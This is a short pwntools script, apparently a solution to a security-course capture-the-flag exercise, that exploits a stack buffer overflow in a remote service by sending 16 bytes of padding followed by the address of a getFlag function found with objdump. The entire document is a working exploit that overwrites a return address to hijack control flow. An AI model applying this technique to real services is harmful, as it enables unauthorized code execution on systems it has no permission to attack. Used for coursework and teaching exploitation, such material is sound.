#!/usr/bin/python3

from pwn import *

io = remote('INF226.puffling.no', 7001)

# 00000000004011d6 <getFlag> from objdump -d ./01
line = b'A' * 16 + b'\xd6\x11\x40\x00\x00\x00\x00\x00'
io.sendline(line)

print(io.recvall())